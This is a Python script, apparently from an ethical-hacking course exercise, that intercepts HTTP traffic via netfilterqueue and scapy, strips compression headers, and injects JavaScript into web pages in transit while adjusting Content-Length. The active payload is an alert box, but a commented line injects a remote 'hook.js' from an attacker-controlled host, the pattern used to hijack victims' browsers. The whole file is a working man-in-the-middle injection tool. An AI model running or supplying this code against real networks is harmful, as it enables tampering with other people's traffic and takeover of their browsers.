#!/usr/bin/env python

# This will only Work in HTTP websites

import netfilterqueue
import scapy.all as scapy
# Pythex
import re

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].chksum
    del packet[scapy.IP].len
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+]HTTP Request")
            # re.sub(String We want to modify, String modified, String we get the load from)
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1" , "HTTP/1.0")
            print(scapy_packet.show())
            # load = re.sub("encoding=.*?>", "?>", load)

        elif scapy_packet[scapy.TCP].sport == 10000:
            print("HTTP Response")
            # injection_code = '<script src="http://IP/hook.js"</script>'
            injection_code = "<script>alert('Hello There...');</script>"
            # print(scapy_packet.show())
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                # First thing that u match of the String
                # content_length = content_length_search.group(0) will return everything
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
                print("Old:", content_length)
                print("New:", new_content_length)

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
